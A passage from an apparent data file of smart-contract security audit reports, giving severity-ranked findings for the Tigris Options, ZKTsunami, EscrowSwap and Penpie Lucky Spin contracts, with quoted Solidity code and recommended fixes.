"!maxOpen");\r\n        require(_tradeInfo.collateral <= asset.maxCollateral, "!max");\r\n        require(_tradeInfo.collateral >= asset.minCollateral, "!min");\r\n```\r\n\r\n### [H-3] CloseTrade can deprive users of their rewards\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L321)\r\n\r\n**Impact:** The vulnerability affects the determination of winning trades, potentially leading to incorrect outcomes and depriving users of their rewards.\r\n\r\n**Description:** In Tigris\'s options implementation, users either lose 100% or win 70% (win percent) of their pledged collateral.\r\n\r\nThe "winning" formula looks like this:\r\n\r\n```solidity\r\n\r\n    function closeTrade(\r\n        uint256 _id,\r\n        PriceData calldata _priceData,\r\n        bytes calldata _signature\r\n    )\r\n        external\r\n    {\r\n        ...\r\n        bool isWin;\r\n        if (_trade.direction && _price > _trade.openPrice) {\r\n            isWin = true;\r\n        } else if(!_trade.direction && _price < _trade.openPrice) {\r\n            isWin = true;\r\n        }\r\n        ...\r\n```\r\n\r\nIf trade direction is true, then the option is a _long_, otherwise its a _short_. Dissecting that further, we can observe the price of the trade is a significant factor as well.\r\n\r\nSo, if a order is a long the price currently fetched by the oracle **must be** higher than the price at the time the option was opened.\r\n\r\nOn the other hand, if its a **short**, the price **must be** lower than to consider the trade as a win. However, that\'s not entirely true, as the price actually **must be** lower than OR equal to the price at the time the option was created.\r\n\r\nHowever, currently the function doesn\'t account of that, meaning it will consider such trades a loss instead of win, thereby depriving users from their rewards.\r\n\r\n**Recommendation:** To address this vulnerability, the code logic needs to be updated to include the equality check. The correct logic for determining a winning trade when the trade direction is short should be as follows:\r\n\r\n```diff\r\n+} else if(!_trade.direction && _price <= _trade.openPrice) {\r\n   isWin = true;\r\n}\r\n```\r\n\r\n## Medium Risk\r\n\r\n### [M-1] No check for active Arbitrum Sequencer in getVerifiedPrice\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L362)\r\n\r\n**Impact:** The missing Sequencer Uptime Feed check in the `getVerifiedPrice` function potentially exposes users to inaccurate oracle data when the Arbitrum Sequencer is down, making the platform vulnerable to stale pricing attacks.\r\n\r\n**Description:** If the Arbitrum Sequencer goes down, oracle data will not be kept up to date, and thus could become stale. However, users are able to continue to interact with the protocol directly through the L1 optimistic rollup contract. You can review Chainlink docs on\xa0[L2 Sequencer Uptime Feeds](https://docs.chain.link/docs/data-feeds/l2-sequencer-feeds/)\xa0for more details on this.\r\n\r\nIn the current implementation of the `Options.sol` contract, there is no check for the Sequencer Uptime Feed before the oracle data is returned by the `getVerifiedPrice` function. This could lead to the return of stale data, specifically when the Arbitrum Sequencer goes down.\r\n\r\nUnder such circumstances, the oracle data would not be updated, and users would continue to interact with the protocol through the L1 optimistic rollup contract.\r\n\r\nFor instance, if a user who holds tokens worth 1 ETH each initiates a trade, and the sequencer goes down before the trade\'s expiry blockstamp, the oracle would return stale price data. If the token\'s price were to drop to 0.5 ETH while the sequencer is down, the bot wouldn\'t be able to liquidate the user\'s trade due to the stale price data, thereby exposing the platform to potential losses.\r\n\r\nHowever, given that the chainlink feed can be turned off, this doesn\'t qualify for more than a medium.\r\n\r\n**Recommendation:** Adapt the following check from Chainlink\'s documentation:\r\n\r\n```solidity\r\n(\r\n            /*uint80 roundID*/,\r\n            int256 answer,\r\n            uint256 startedAt,\r\n            /*uint256 updatedAt*/,\r\n            /*uint80 answeredInRound*/\r\n        ) = sequencerUptimeFeed.latestRoundData();\r\n\r\n        // Answer == 0: Sequencer is up\r\n        // Answer == 1: Sequencer is down\r\n        bool isSequencerUp = answer == 0;\r\n        if (!isSequencerUp) {\r\n            revert SequencerDown();\r\n        }\r\n\r\n        // Make sure the grace period has passed after the sequencer is back up.\r\n        uint256 timeSinceUp = block.timestamp - startedAt;\r\n        if (timeSinceUp <= GRACE_PERIOD_TIME) {\r\n            revert GracePeriodNotOver();\r\n        }\r\n```\r\n\r\n## Low Risk\r\n\r\n### [L-1] Missing asset existence check\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L548-L559)\r\n\r\n**Impact**\r\n\r\nThe `setTradedAsset` function allows adding assets to the system by setting various parameters for the asset. However, it lacks a check to verify whether an asset with the same ID already exists. As a result, if an asset with the same ID is passed to this function, the existing asset will be overwritten with the new values, regardless of whether it was intentional or not.\r\n\r\n```solidity\r\n    function setTradedAsset(\r\n        uint _id,\r\n        uint _maxC,\r\n        uint _minC,\r\n        uint _maxD,\r\n        uint _minD,\r\n        uint _maxO,\r\n        uint _winP,\r\n        uint[] calldata _fees\r\n    ) external onlyOwner {\r\n        require(_maxC > _minC, "!C");\r\n        require(_maxD > _minD, "!D");\r\n\r\n        TradedAsset storage _asset = tradedAssets[_id];\r\n\r\n        _asset.maxCollateral = _maxC;\r\n        _asset.minCollateral = _minC;\r\n        _asset.maxDuration = _maxD;\r\n        _asset.minDuration = _minD;\r\n        _asset.maxOpen = _maxO;\r\n        _asset.assetId = _id;\r\n        _asset.winPercent = _winP;\r\n        _asset.closeFee = _fees[0];\r\n        _asset.botFee = _fees[1];\r\n        _asset.refFee = _fees[2];\r\n    }\r\n```\r\n\r\n**Recommendation**\r\n\r\nIt is recommended to add a check in the `setTradedAsset` function to ensure that an asset with the same ID doesn\'t already exist in the system. Here is a modified version of the function with the added check:\r\n\r\n```diff\r\nfunction setTradedAsset(\r\n    uint _id,\r\n    uint _maxC,\r\n    uint _minC,\r\n    uint _maxD,\r\n    uint _minD,\r\n    uint _maxO,\r\n    uint _winP,\r\n    uint[] calldata _fees\r\n) external onlyOwner {\r\n    require(_maxC > _minC, "!C");\r\n    require(_maxD > _minD, "!D");\r\n\r\n+    require(tradedAssets[_id].assetId == 0, "Asset already exists");\r\n\r\n    TradedAsset storage _asset = tradedAssets[_id];\r\n\r\n    _asset.maxCollateral = _maxC;\r\n    _asset.minCollateral = _minC;\r\n    _asset.maxDuration = _maxD;\r\n    _asset.minDuration = _minD;\r\n    _asset.maxOpen = _maxO;\r\n    _asset.assetId = _id;\r\n    _asset.winPercent = _winP;\r\n    _asset.closeFee = _fees[0];\r\n    _asset.botFee = _fees[1];\r\n    _asset.refFee = _fees[2];\r\n}\r\n\r\n```\r\n\r\n### [L-2] Redundant TradeAsset variables\r\n\r\n**Context:** [Options.sol](https://github.com/Tigris-Trade/Contracts/blob/440009d18ab7c4ac1bdbc87a4381e7e41f38041a/contracts/options/Options.sol#L565-L568)\r\n\r\n**Impact:** The current implementation of the `setTradedAsset` function includes the assignment of `maxDuration`, `minDuration`, and `assetId` variables to values, but these variables are unused in the rest of the code. This redundancy may lead to confusion and unnecessary storage consumption.\r\n\r\n**Description:** Within the `setTradedAsset` function, the following lines assign values to the variables `maxDuration`, `minDuration`, and `assetId`:\r\n\r\n```solidity\r\n        _asset.maxDuration = _maxD;\r\n        _asset.minDuration = _minD;\r\n        _asset.assetId = _id;\r\n```\r\n\r\nHowever, these variables are not referenced or utilized anywhere else within the function or the surrounding code. As a result, these assignments are redundant and do not serve any purpose in the current implementation.\r\n\r\n**Recommendation:** If that\'s the intended behavior, it is recommended to remove the unused assignments of `maxDuration`, `minDuration`, and `assetId` from the `setTradedAsset` function.',pdfLink:"https://github.com/bytes032/reports/blob/main/TT-Options.pdf"},{title:"ZKTsunami",slug:"zktsunami",description:"ZKTsunami is a ZKSnark who claims to provide ZK-ANONSNARK powered transactional anonymity at your fin- gertips. Zcash was the first to implement and apply ZK-SNARK in the decentralized cryptocurrency. The relatively costly proof generation further reduces the likelihood of its adoption in practice. ZKTsunami implements and integrates the state-of-the-art setup-free zero-knowledge proof protocol to enable trustless anonymous payment for smart contract platforms. Their proposed ZK-AnonSNARK scheme also attains the optimal balance between performance and security, i.e., almost constant proof size and efficient proof generation and verification.",findings:4,createdAt:"2023-06-03T03:52:32.356Z",body:'---\r\n\r\n# Findings\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Inconsistency in ZKT existence check can lead to overwritting existing ZKTs\r\n\r\n**Context:** [Tsunami.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/Tsunami.sol#L78-L93)\r\n\r\n**Impact:** This issue is of critical severity, because it allows admins to replace already existing ZKT\'s in the Tsunami contract, thereby potentially causing serious disruption and violating the integrity of the protocol.\r\n\r\n**Description:** Within the Tsunami.sol smart contract, there is an inconsistency in how ZKT existence is checked and set. Specifically, the `addZKT` function checks if the uint256 representation of `keccak256(abi.encode(symbol))` exists, but then sets it as `uint256(bytes32(bytes(symbol))`.\r\n\r\nThe problem arises from the inequality of `uint256(keccak256(abi.encode(symbol)))` and `uint256(bytes32(bytes(symbol)))`. As a result, the existence check will always fail.\r\n\r\nThis issue is present in the following code block:\r\n\r\n```solidity\r\n function addZKT(string calldata symbol, address token_contract_address) public onlyAdmin {\r\n        bytes32 zktHash = keccak256(abi.encode(symbol));\r\n        uint256 zktId = uint256(zktHash);\r\n\r\n        bool zktExists = zkts.contains(zktId);\r\n        if (zktExists) {\r\n            revert("ZKT already exists for this token.");\r\n        }\r\n\r\n        address erc20 = erc20Factory.newZKTERC20(address(this), token_contract_address);\r\n        zkts.set(uint256(bytes32(bytes(symbol))), erc20);\r\n        ZKTBase(erc20).setUnit(10000000000000000);\r\n        ZKTBase(erc20).setAgency(payable(msg.sender));\r\n        ZKTBase(erc20).setAdmin(msg.sender);\r\n    }\r\n```\r\n\r\n**Recommendation:** To rectify this critical issue, it is suggested to use the same `uint256(bytes32(bytes(symbol)))` for both the existence check and the set operation. This consistency will ensure accurate ZKT existence verification.\r\n\r\n```diff\r\n function addZKT(string calldata symbol, address token_contract_address) public onlyAdmin {\r\n+        uint256 zktId = uint256(bytes32(bytes(symbol))\r\n\r\n        bool zktExists = zkts.contains(zktId);\r\n        if (zktExists) {\r\n            revert("ZKT already exists for this token.");\r\n        }\r\n\r\n        address erc20 = erc20Factory.newZKTERC20(address(this), token_contract_address);\r\n        zkts.set(uint256(bytes32(bytes(symbol))), erc20);\r\n        ZKTBase(erc20).setUnit(10000000000000000);\r\n        ZKTBase(erc20).setAgency(payable(msg.sender));\r\n        ZKTBase(erc20).setAdmin(msg.sender);\r\n    }\r\n```\r\n\r\n### [M-2] Absence of toTokenAmount function hinders usability of ZKETH fund(...)\r\n\r\n**Context:** [ZKETH.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/ZKTETH.sol#L14-L16)\r\n\r\n**Impact:** This issue renders the `fund` function in the ZKETH contract practically unusable, thus potentially preventing users from depositing native tokens.\r\n\r\nIn the ZKETH contract, the `fund` function is trying to use a function called `toTokenAmount` for the validation of the amount that is to be processed. However, upon reviewing the provided code and available functions in the codebase, it\'s clear that there is no such function named `toTokenAmount`.\r\n\r\nThe code snippet for the `fund` function is as follows:\r\n\r\n```solidity\r\n    // Fund function to deposit native tokens\r\n    function fund(bytes32[2] calldata y, uint256 unitAmount, bytes calldata encGuess) override external payable {\r\n        uint256 tokenAmount = toTokenAmount(msg.value);\r\n```\r\n\r\nIn the codebase, there is a function named `toUnitAmount` present in the Utils contract, but `toTokenAmount` is nowhere to be found.\r\n\r\nHere\'s the code snippet for `toUnitAmount`:\r\n\r\nhttps://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/ZKTBase.sol#L66-L71\r\n\r\n```solidity\r\n   function toUnitAmount(uint256 nativeAmount) internal view returns (uint256) {\r\n        require(nativeAmount % bank.unit == 0, "error: invalid nativeAmount.");\r\n        uint256 amount = nativeAmount / bank.unit;\r\n        require(0 <= amount && amount <= bank.MAX, "toUnitAmount: out of range.");\r\n        return amount;\r\n    }\r\n```\r\n\r\nThis practically means the `fund` function is unuseable as is.\r\n\r\n**Recommendation:** To rectify this issue, it\'s recommended to replace the non-existent `toTokenAmount` with `toUnitAmount` in the `fund` function, assuming `toUnitAmount` provides the necessary functionality required by `fund`. This will ensure that the `fund` function will perform as intended.\r\n\r\n## Low Risk\r\n\r\n### [L-1] Unaddressed function renaming in Utils.sol breaks all the contracts that depend on it\r\n\r\n**Context:** [TransferVerifier.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/TransferVerifier.sol#L208), [BurnVerifier.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/BurnVerifier.sol#L118), [InnerProductVerifier.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/InnerProductVerifier.sol#L207-L212)\r\n\r\n**Impact:** This issue renders any contract that relies on Utils.sol unusable. The renaming of key functions in Utils.sol without accounting for these changes throughout the rest of the codebase has resulted in a breakdown of the contract execution and interdependencies.\r\n\r\n**Description**\r\n\r\nThe Utils.sol contract is a heavily modified version of the Suterusu Utils.sol contract. A range of functions have been renamed in the ZKT\'s implementation:\r\n\r\n1.  pAdd -> pointAdd\r\n2.  pMul -> pointMul\r\n3.  pNeg -> pointNeg\r\n4.  pEqual -> pointEqual\r\n5.  g -> generator\r\n6.  h -> cofactor\r\n7.  mapInto -> mapToCurve\r\n8.  slice -> extractSlice\r\n9.  uint2str -> uintToString\r\n\r\nDespite these significant changes, the rest of the codebase does not reflect the new function names. This oversight has caused a cascading effect, where contracts such as TransferVerifier.sol, BurnVerifier.sol, and InnerProductVerifier.sol, which rely on Utils.sol, cannot execute properly due to unrecognized function calls. Essentially, these contracts have been "bricked" due to the changes in Utils.sol.\r\n\r\n**Recommendation:** To rectify this issue, it is imperative to reflect the name changes throughout the entire codebase. Every contract that relies on Utils.sol needs to be updated to call the correctly renamed functions. This will ensure proper interaction between contracts and restore the intended functionality.\r\n\r\nAlternatively, consider reverting the function names to their original form if the renaming is not crucial. This option would also require a thorough check of the codebase to ensure the integrity and functionality of the contracts.\r\n\r\n### [L-2] Misalignment of variable names in the register() function\r\n\r\n**Context:** [Tsunami.sol](https://github.com/Uno-Re/unore-zkt-audit/blob/8c58c3063e577e8a85612e954dfb6cc93f7ac3e2/Tsunami.sol#L170-L173)\r\n\r\n**Description:** The register function in the smart contract begins with an attempt to create a Utils.ECPoint struct. However, there is a discrepancy in the variable names used. The function attempts to assign values to X and Y, but the ECPoint struct expects the lowercase versions x and y.\r\n\r\nHere is the code snippet in question:\r\n\r\n```solidity\r\n    function register(bytes32[2] calldata y_tuple, uint256 c, uint256 s) external {\r\n        // Calculate y\r\n        Utils.ECPoint memory y = Utils.ECPoint({\r\n            X: y_tuple[0],\r\n            Y: y_tuple[1]\r\n        });\r\n```\r\n\r\nIn contrast, the ECPoint struct is defined as follows:\r\n\r\n```solidity\r\n    struct ECPoint {\r\n        bytes32 x;\r\n        bytes32 y;\r\n    }\r\n```\r\n\r\n**Recommendation:** To resolve this issue, the variables `X` and `Y` should be replaced with `x` and `y` in the `register` function to align with the `ECPoint` struct. This modification ensures the contract will compile and run as expected:\r\n\r\n```diff\r\n    function register(bytes32[2] calldata y_tuple, uint256 c, uint256 s) external {\r\n        // Calculate y\r\n        Utils.ECPoint memory y = Utils.ECPoint({\r\n+            x: y_tuple[0],\r\n+            y: y_tuple[1]\r\n-            X: y_tuple[0],\r\n-            Y: y_tuple[1]\r\n        });\r\n\r\n```\r\n',pdfLink:"https://github.com/bytes032/reports/blob/main/ZKTsunami.pdf"},{slug:"escrowswap",title:"EscrowSwap",description:"Escrow swap is a platform, which allows users to create and adjust otc trades. All open trades are listed on their website for the users to navigate easily.",createdAt:"2023-06-09T03:52:32.356Z",findings:4,body:"---\r\n\r\n# Findings\r\n\r\n## High Risk\r\n\r\n### [H-1] Unhandled Overpayment in Native Token Transfers\r\n\r\n**Context:** [EscrowSwap.sol](https://github.com/escrowswap/smartcontract.escrowswap/blob/04ff3abfe646be1b3c51b6a695b32635496f9c1d/src/escrowswap_v1.0.sol#L230-L243)\r\n\r\n**Impact:** Users who accidentally send more native tokens than required will not be refunded the excess amount. This could lead to financial losses for users and potentially lead to a loss of trust in the system.\r\n\r\n**Description:** In the `_handleIncomingTransfer` function, if the `_token` address is `0x0`, indicating that native tokens are being sent, the function requires that the `msg.value` is greater than or equal to the `_amount` specified.\r\n\r\n```solidity\r\n    function _handleIncomingTransfer(address _sender, uint256 _amount, address _token, address _dest) private {\r\n        if (_token == address(0)) {\r\n            require(msg.value >= _amount, \"_handleIncomingTransfer msg value less than expected amount\");\r\n        } else {\r\n            // We must check the balance that was actually transferred to this contract,\r\n            // as some tokens impose a transfer fee and would not actually transfer the\r\n            // full amount to the escrowswap, resulting in potentially locked funds\r\n            IERC20 token = IERC20(_token);\r\n            uint256 beforeBalance = token.balanceOf(_dest);\r\n            token.safeTransferFrom(_sender, _dest, _amount);\r\n            uint256 afterBalance = token.balanceOf(_dest);\r\n            require(beforeBalance + _amount == afterBalance, \"_handleIncomingTransfer token transfer call did not transfer expected amount\");\r\n        }\r\n    }\r\n```\r\n\r\nHowever, if the user inadvertently sends more than the required `_amount`, the excess is not refunded or accounted for.\r\n\r\n```solidity\r\n\r\n        TradeOffer memory newOffer = TradeOffer({\r\n            seller: msg.sender,\r\n            tokenOffered: _tokenOffered,\r\n            tokenRequested: _tokenRequested,\r\n>            amountOffered: _amountOffered,\r\n            amountRequested: _amountRequested\r\n        });\r\n```\r\n\r\nThe function simply accepts the excess amount without notifying the user or taking any further action. However, given the fact that its mostly expected for users to pass `msg.value` that equals `tokensOffered` this is realistic, yet not that likely scenario.\r\n\r\nHowever, the same vulnerability exists when accepting a trade offer.\r\n\r\n```solidity\r\nfunction acceptTradeOffer(uint256 _id, address _tokenRequested, uint256 _amountRequested)\r\n    payable\r\n    external\r\n    nonReentrant\r\n    nonEmergencyCall\r\n    {\r\n        TradeOffer memory trade = tradeOffers[_id];\r\n\r\n        if (trade.tokenRequested != _tokenRequested) { revert MisalignedTradeData(); }\r\n        if (trade.amountRequested != _amountRequested) { revert MisalignedTradeData(); }\r\n        if (trade.amountOffered == 0) { revert EmptyTrade(); }\r\n\r\n        _deleteTradeOffer(_id);\r\n        emit TradeOfferAccepted(_id, msg.sender);\r\n\r\n        //Transfer from buyer to seller.\r\n        _handleRelayTransfer(\r\n            msg.sender,\r\n            trade.amountRequested,\r\n            trade.tokenRequested,\r\n            address(trade.seller)\r\n        );\r\n\r\n        //Fee Payment calculation and exec.\r\n        _handleFeePayout(\r\n            msg.sender,\r\n            trade.amountRequested,\r\n            trade.tokenRequested,\r\n            trade.tokenOffered\r\n        );\r\n\r\n        //Transfer from the vault to buyer.\r\n        _handleOutgoingTransfer(msg.sender, trade.amountOffered, trade.tokenOffered);\r\n    }\r\n```\r\n\r\nGiven it's not really practical for the callee to calculate the **exact** amount to be processed beforehand, it is **very** likely that he or she will just send slightly more so the transaction goes through.\r\n\r\nHowever, if that happens the extra money that the callee sent would be lost, because the `acceptTradeOffer` function doesn't account for this scenario.\r\n\r\n**Recommendation:** To mitigate this vulnerability, both functions should be modified to refund any excess native tokens sent by the user. This can be accomplished by sending back the difference between `msg.value` and `_amount` to the sender.\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Hardcoded WETH Address Leads to Cross-chain Incompatibility\r\n\r\n**Context:** [EscrowSwap.sol](https://github.com/escrowswap/smartcontract.escrowswap/blob/04ff3abfe646be1b3c51b6a695b32635496f9c1d/src/escrowswap_v1.0.sol#L66)\r\n\r\n**Impact:** This vulnerability potentially restricts the system's functionality to a single chain, Ethereum, due to the hardcoded Wrapped Ether (WETH) address.\r\n\r\nTherefore, the contract cannot be used on other blockchains like Polygon, leading to significant limitations in cross-chain interoperability.\r\n\r\n**Description:** In the provided Solidity code snippet, the WETH address is hardcoded to the address `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`. This means that the system is implicitly tied to the Ethereum network where this WETH contract resides.\r\n\r\nhttps://github.com/escrowswap/escrowswap-sol-only/blob/cc2a1577c5212a146f21ed3f03f6ffa5d778aad1/escrowswap_v1.0.sol#L59-L60\r\n\r\n```solidity\r\n        weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n        // @audit won't work for multiple chains\r\n```\r\n\r\nCross-chain functionality is crucial for many decentralized applications (dApps) to tap into various liquidity sources or to leverage different advantages of different chains. However, due to this hardcoded WETH address, the system will not function correctly on other chains. For example, on the Polygon network, this hardcoded address will not refer to a WETH contract, and consequently, any functionality reliant on WETH will fail.\r\n\r\n**Recommendation:** It is highly recommended to remove the hardcoded WETH address and replace it with an immutable variable contract that is passed as an argument in the constructor during contract deployment.\r\n\r\nThis approach will allow for different WETH addresses to be used, depending on the chain where the contract is being deployed, ensuring cross-chain compatibility.\r\n\r\n### [M-2] Unchecked ether transfer during ERC20 transfers in \\_handleIncomingTransfer\r\n\r\n**Context:** [EscrowSwap.sol](https://github.com/escrowswap/smartcontract.escrowswap/blob/04ff3abfe646be1b3c51b6a695b32635496f9c1d/src/escrowswap_v1.0.sol#L233-L242)\r\n\r\n**Impact:** This vulnerability could have a high impact on users as it can potentially lead to loss of funds. Users might accidentally send additional ether when interacting with the contract, particularly when transferring ERC20 tokens. As the contract currently stands, the unprocessed ether gets trapped in the contract without a way to retrieve it.\r\n\r\n**Description:** The `_handleIncomingTransfer` function is responsible for processing incoming transfers within the trade offer creation process. It distinguishes between Ethereum (0x address) and ERC20 token transfers.\r\n\r\n```solidity\r\n    function _handleIncomingTransfer(address _sender, uint256 _amount, address _token, address _dest) private {\r\n        if (_token == address(0)) {\r\n            require(msg.value >= _amount, \"_handleIncomingTransfer msg value less than expected amount\");\r\n\r\n        } else {\r\n            // We must check the balance that was actually transferred to this contract,\r\n            // as some tokens impose a transfer fee and would not actually transfer the\r\n            // full amount to the escrowswap, resulting in potentially locked funds\r\n\r\n            IERC20 token = IERC20(_token);\r\n            uint256 beforeBalance = token.balanceOf(_dest);\r\n            token.safeTransferFrom(_sender, _dest, _amount);\r\n            uint256 afterBalance = token.balanceOf(_dest);\r\n            require(beforeBalance + _amount == afterBalance, \"_handleIncomingTransfer token transfer call did not transfer expected amount\");\r\n        }\r\n    }\r\n```\r\n\r\nIn the case of Ethereum transfers, the function ensures that the message value (`msg.value`) is greater than or equal to the expected amount.\r\n\r\nFor ERC20 token transfers, the function transfers the tokens from the sender to the destination address and checks if the transferred amount is equal to the expected amount.\r\n\r\nHowever, the function lacks safeguards to prevent accidental loss of funds. When the function is called to process an ERC20 token transfer, it does not verify whether extra ether was also sent in the transaction (`msg.value > 0`). As a result, if a user inadvertently includes additional ether in the transaction, these funds will become permanently stuck in the contract.\r\n\r\n**Recommendation:** To protect users against accidental loss of funds, the `_handleIncomingTransfer` function should include a check to confirm that `msg.value` equals zero when handling ERC20 token transfers. If `msg.value > 0`, the contract should revert the transaction and emit an appropriate error message. This modification will prevent users from accidentally sending extra ether in these transactions.\r\n\r\nHere's how you can add this safeguard:\r\n\r\n```solidity\r\n    else {\r\n        require(msg.value == 0, \"_handleIncomingTransfer: Unexpected Ether transfer\");\r\n        // The rest of your code\r\n    }\r\n```\r\n\r\nWith this check in place, any transactions that mistakenly include ether alongside an ERC20 token transfer will be automatically reverted, protecting users from unintentional loss of funds.\r\n\r\n## Low Risk\r\n\r\n### [L-1] Outgoing transfers are vulnerable to returnbombs\r\n\r\n**Context:** [EscrowSwap.sol](https://github.com/escrowswap/smartcontract.escrowswap/blob/04ff3abfe646be1b3c51b6a695b32635496f9c1d/src/escrowswap_v1.0.sol#L265)\r\n\r\n**Impact:** A successful exploitation of this vulnerability could allow an attacker to perform a Denial of Service (DoS) attack against the EscrowSwap callers. By forcing the contract to exhaust all its gas through a 'returnbomb'.\r\n\r\n**Description**\r\n\r\nThe vulnerability arises from the use of a low-level call in the handling of ETH transfers in EscrowSwap:\r\n\r\n```\r\n(bool success, ) = _dest.call{value: _amount, gas: gas}(\"\");`\r\n```\r\n\r\nA standard Solidity call such as the one used above automatically copies bytes to memory without considering gas costs. This means that the call will copy any amount of bytes to local memory. When bytes are copied from returndata to memory, the memory expansion cost is paid.\r\n\r\nThe issue lies in the fact that this gas is paid by the caller and in the caller's context. Thus, the callee can impose an arbitrary gas cost on the caller by 'returnbombing', causing the caller to exhaust its gas and halt execution.\r\n\r\n**Recommendation**\r\n\r\nTo prevent the 'returnbombing' issue, it is recommended to utilize `ExcessivelySafeCall` available at:\r\n\r\n[https://github.com/nomad-xyz/ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall)\r\n\r\nAs an alternative, you could adopt Chainlink's `_callWithExactGas` approach which has implemented gas management in a more controlled way:\r\n\r\n[https://github.com/code-423n4/2023-05-chainlink/blob/1d84bf6f19f3200eea6dbaf99e378ea8a772d8c6/contracts/Router.sol#L190-L233](https://github.com/code-423n4/2023-05-chainlink/blob/1d84bf6f19f3200eea6dbaf99e378ea8a772d8c6/contracts/Router.sol#L190-L233)\r\n\r\nBoth of these methods provide improved control over the gas consumption during contract execution, preventing the potential for a DoS attack via the 'returnbomb' mechanism.\r\n",pdfLink:"https://github.com/bytes032/reports/blob/main/EscrowSwap.pdf"},{title:"Penpie Lucky Spin",slug:"pluckyspin",description:"Penpie is a next-generation DeFi platform designed to provide Pendle Finance users with yield and veTokenomics boosting services. Integrated with Pendle Finance, Penpie focuses on locking PENDLE tokens to obtain governance rights and enhanced yield benefits within Pendle Finance. Penpie revolutionizes the way users can maximize returns on their investments and monetize their governance power.",findings:10,createdAt:"2023-09-03T03:52:32.356Z",body:"---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] Reward expiration prevents future interactions\r\n\r\n**Context**: [PenpieLuckySpin](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L141-L152)\r\n\r\n**Impact:** Users who let their rewards expire can no longer use the contract, as they will be permanently prevented from interacting further due to the state of the waitingClaim flag.\r\n\r\n**Description:** The lottary uses the waitingClaim flag to manage user interactions. When users spin the wheel, their waitingClaim is set to true:\r\n\r\n```solidity\r\nuserInfo.waitingClaim = true;\r\n```\r\n\r\nThis prevents users from spinning the wheel while they have a reward pending:\r\n\r\n```solidity\r\nfunction _spin(uint256 _inputAmount) internal returns (uint256 requestID) {\r\n    UserSpinInfo storage userInfo = userSpinInfos[msg.sender];\r\n    if (userInfo.waitingClaim) revert WaitToClaim();\r\n}\r\n```\r\n\r\nBut also ensures they have pending rewards:\r\n\r\n```solidity\r\nfunction getRewards() external whenNotPaused nonReentrant {\r\n    UserSpinInfo storage userInfo = userSpinInfos[msg.sender];\r\n    if(!userInfo.waitingClaim) revert NothingToClaim();\r\n}\r\n```\r\n\r\nHowever, there's a design flaw. Rewards are expirable:\r\n\r\n```solidity\r\nif(\r\n    expiredSecond > 0 &&\r\n    userInfo.spinTime + expiredSecond < block.timestamp\r\n) revert RewardExpired();\r\nuserInfo.waitingClaim = false;\r\n```\r\n\r\nIf a reward expires, the waitingClaim flag **cannot be** reset, preventing the user from further using the contract.\r\n\r\n**Recommendation:** Instead of reverting, just reset the user spin info of the user.\r\n\r\n### [C-2] Pausing the contract can lead to loss of rewards\r\n\r\n**Context:** [PenpieLuckySpin](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L141-L158)\r\n\r\n**Impact:** Users of the PenpieLuckySpin contract may lose their rewards due to an inability to claim them during contract pause periods. This can result in a loss of trust in the system and potential monetary loss for the users.\r\n\r\n**Description:** The getRewards function is designed to allow users to claim their rewards. However, there's a conditional check that ensures rewards are not claimed after their expiration:\r\n\r\n```solidity\r\nfunction getRewards() external whenNotPaused nonReentrant {\r\n        UserSpinInfo storage userInfo = userSpinInfos[msg.sender];\r\n        if(!userInfo.waitingClaim) revert NothingToClaim();\r\n        if(userInfo.waitingVRF) revert UnderSpinning();\r\n\r\n        if(\r\n            expiredSecond > 0 &&\r\n            userInfo.spinTime + expiredSecond < block.timestamp\r\n        ) revert RewardExpired();\r\n        userInfo.waitingClaim = false;\r\n\r\n```\r\n\r\nA potential vulnerability arises due to the contract's ability to be [paused](https://github.com/magpiexyz/penpie-contracts/blob/fffeb5e43e829ae1ed144f25ffa9d81dbaa034c0/contracts/rewards/PenpieLuckySpin.sol#L244-L251):\r\n\r\n```solidity\r\n    function pause() external nonReentrant onlyOwner {\r\n        _pause();\r\n    }\r\n\r\n    function unpause() external nonReentrant onlyOwner {\r\n        _unpause();\r\n    }\r\n```\r\n\r\nWhen the contract is paused, functionalities, including the getRewards function (due to the whenNotPaused modifier), are halted. The issue is that while the contract is paused, the expiration time for the rewards continues to progress, thereby preventing users from claiming their rewards.\r\n\r\nIf the contract remains paused beyond a reward's expiration time, users will be left unable to claim their rewards.\r\n\r\n**Recommendation:** To ensure users don't lose out on their rewards during contract pauses, consider the following solutions:\r\n\r\n1. Remove the whenNotPaused modifier from the getRewards function.\r\n2. Alternatively, implement a mechanism to pause the progression of reward expiration during contract pauses. This can be achieved by adjusting the spinTime or introducing a variable that keeps track of total paused time, offsetting the expiration check accordingly.\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Removing a \"spinReward\" doesnt account for unclaimed user rewards\r\n\r\n**Context**: 